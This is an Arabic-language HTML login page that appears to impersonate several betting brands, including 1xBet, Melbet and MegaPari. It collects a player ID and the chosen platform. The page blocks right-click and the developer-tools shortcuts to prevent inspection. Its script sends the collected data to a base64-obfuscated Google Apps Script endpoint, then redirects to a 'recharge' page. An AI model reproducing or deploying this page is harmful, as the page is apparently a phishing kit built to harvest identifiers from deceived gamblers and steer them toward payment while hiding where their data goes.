<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --header-height: 60px;
      --idbet-color: #e50914;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Tajawal', sans-serif;
      background: #f5f5f5;
      color: #333;
      user-select: none;
    }
    header {
      height: var(--header-height);
      background: #fff;
      display: flex;
      align-items: center;
      padding: 0 16px;
      box-shadow: 0 1px 4px rgba(0, 0, 0, .05);
      border-bottom: 1px solid #eee;
    }
    .header-brand {
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 500;
    }
    .idbet {
      color: var(--idbet-color);
      font-size: 1.1rem;
      font-weight: bold;
    }
    .separator {
      color: #ccc;
    }
    .slogan {
      color: #555;
      font-size: .9rem;
    }
    main {
      display: flex;
      justify-content: center;
      padding: 24px 12px;
    }
    .login-box {
      background: #fff;
      padding: 28px 20px;
      max-width: 400px;
      width: 100%;
      border-radius: 14px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, .06);
    }
    .title-wrapper {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 1.3rem;
      font-weight: bold;
      margin-bottom: 16px;
      color: #222;
    }
    .step-box {
      width: 32px;
      height: 32px;
      background: var(--idbet-color);
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .input-label {
      margin-bottom: 6px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 4px;
    }
    .info-icon {
      width: 20px;
      height: 20px;
      border: 2px solid #666;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.95rem;
      cursor: help;
      color: #666;
      transition: all 0.3s ease;
    }
    .info-icon:hover {
      border-color: var(--idbet-color);
      background: rgba(229, 9, 20, 0.08);
      color: var(--idbet-color);
    }
    .input-group {
      margin-bottom: 12px;
    }
    .input-wrapper {
      position: relative;
    }
    .input-wrapper input {
      width: 100%;
      padding: 8px;
      font-size: 0.95rem;
      border: 1px solid #bbb;
      border-radius: 6px;
      outline: none;
      padding-left: 40px;
    }
    .status-icon {
      position: absolute;
      left: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      border-radius: 50%;
      display: none;
      align-items: center;
      justify-content: center;
    }
    .status-spinner {
      border: 2px solid #ccc;
      border-top: 2px solid var(--idbet-color);
      animation: spin 0.8s linear infinite;
    }
    .status-check {
      background: #28a745;
      color: white;
      font-size: 12px;
    }
    .error-message {
      font-size: 0.8rem;
      margin-top: 4px;
      min-height: 18px;
      text-align: center;
      color: #d32f2f;
    }
    .platform-icons {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin: 16px 0 18px;
    }
    .icon {
      position: relative;
      width: 85px;
      height: 85px;
      border-radius: 12px;
      background: #fff;
      box-shadow: 0 2px 8px rgba(0, 0, 0, .04);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 8px;
      border: 1px solid #eee;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    .icon:hover {
      background-color: #fafafa;
      box-shadow: 0 4px 12px rgba(0, 0, 0, .08);
    }
    .icon.selected {
      border-color: var(--idbet-color);
      box-shadow: 0 0 8px rgba(229, 9, 20, .3);
    }
    .icon.selected::after {
      content: "✓";
      position: absolute;
      top: 5px;
      left: 5px;
      width: 18px;
      height: 18px;
      background: var(--idbet-color);
      color: #fff;
      border-radius: 50%;
      font-size: 11px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .icon img {
      height: 40px;
      max-width: 80%;
      object-fit: contain;
    }
    .icon-name {
      margin-top: 6px;
      font-size: 0.8rem;
      color: #222;
      text-align: center;
    }
  </style>
  <script>
    // تعطيل زر الفأرة الأيمن واختصارات فحص الكود
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.onkeydown = function (e) {
      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
        e.preventDefault(); return false;
      }
    };
  </script>
</head>
<body>
  <section class="login-box">
    <div class="title-wrapper">
      <div class="step-box">
        <svg viewBox="0 0 32 32" width="20" height="20" fill="white" xmlns="http://www.w3.org/2000/svg">
          <path d="M28 18.7c-.5-3.8-2-7.5-4.6-10.4C21.6 6 20 3.8 20 .7a.7.7 0 00-1-.6 17 17 0 00-6.3 9c-.5 2.3-.7 4.6-.7 6.8-2.7-.6-3.3-4.6-3.3-4.7a.7.7 0 00-1-.5c-.1.1-3.5 1.8-3.7 8.6v.7a12 12 0 0012 12 12 12 0 0012-13.3zm-12 12a4.1 4.1 0 01-4-4.3V26c0-.7.1-1.4.4-2a2.4 2.4 0 002.2 1.5.7.7 0 00.7-.6c0-1 0-2 .2-3 .3-1 .8-1.9 1.4-2.6.3.9.8 1.7 1.4 2.5 1 1.2 1.5 2.6 1.7 4.1v.4a4.1 4.1 0 01-4 4.3z"/>
        </svg>
      </div>
      <h2>تسجيل الدخول</h2>
    </div>

    <div class="input-label">
      <label for="player-id-1">معرّف اللاعب</label>
      <span class="info-icon" title="رقم مكوَّن من 7 إلى 15 رقمًا">?</span>
    </div>

    <div class="input-group">
      <div class="input-wrapper">
        <input id="player-id-1" type="text" placeholder="أدخل المعرّف" maxlength="15" />
        <div class="status-icon" id="status-icon"></div>
      </div>
      <div class="error-message" id="error-message"></div>
    </div>

    <div class="platform-icons" id="platforms">
      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" /><div class="icon-name">LineBet</div></div>
      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" /><div class="icon-name">MegaPari</div></div>
      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" /><div class="icon-name">Melbet</div></div>
      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" /><div class="icon-name">Gooobet</div></div>
      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" /><div class="icon-name">1xBet</div></div>
    </div>

    <button class="login-btn" id="login-btn" disabled>تسجيل الدخول</button>
  </section>
</main>

<script>
(function(){
  const i=document.getElementById('player-id-1'),
        e=document.getElementById('error-message'),
        t=document.getElementById('login-btn'),
        n=document.querySelectorAll('.icon'),
        s=document.getElementById('status-icon');
  let r=null;
  const o=/^(\d)\1{6,}$/;
  i.addEventListener('keydown',a=>{
    const d=['Backspace','Delete','ArrowLeft','ArrowRight','Tab'];
    if(!d.includes(a.key)&&!/^\d$/.test(a.key))a.preventDefault();
  });
  i.addEventListener('input',l);
  n.forEach(c=>{
    c.addEventListener('click',()=>{
      n.forEach(f=>f.classList.remove('selected'));
      c.classList.add('selected');r=c.dataset.name;l();
    });
  });
  function l(){
    const a=i.value.replace(/\D/g,'');
    i.value=a;e.textContent='';t.disabled=true;
    if(a.length<7){
      s.style.display='none';s.className='status-icon';s.innerHTML='';return;
    }
    s.style.display='flex';s.className='status-icon status-spinner';s.innerHTML='';
    setTimeout(()=>{
      if(o.test(a)){e.textContent='المعرّف غير صالح';s.style.display='none';return;}
      if(!r){e.textContent='يرجى اختيار المنصة.';s.style.display='none';return;}
      t.disabled=false;s.className='status-icon status-check';s.innerHTML='✓';
    },500);
  }

  const encrypted = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6UVhxZllLM3J6U1NSLVpLWUR4c2ExaXFUNVVwZmZsSG5EWlFWblUzaEt4Tm9MR0owM2dQTzBLSWlqSDVZWmVsUWczQS9leGVj";
  const apiURL = atob(encrypted);

  t.addEventListener('click',async()=>{
    t.innerHTML='<span class="btn-spinner"></span> جارٍ التحقق...';t.disabled=true;
    const p={userId:i.value,platform:r};
    try{
      await fetch(apiURL,{
        method:'POST',
        mode:'no-cors',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(p)
      });
      setTimeout(()=>{
        localStorage.setItem('userId',i.value);
        window.location.href='fr/office/recharge.html';
      },1200);
    }catch(u){
      e.textContent='حدث خطأ أثناء التحقق، حاول مجددًا.';t.innerHTML='تأكيد';t.disabled=false;
    }
  });

  window.addEventListener('pageshow',()=>{
    t.disabled=true;t.innerHTML='تأكيد';e.textContent='';i.value='';r=null;
    s.style.display='none';s.className='status-icon';s.innerHTML='';
    n.forEach(g=>g.classList.remove('selected'));
  });
})();
</script>

</body>
</html>
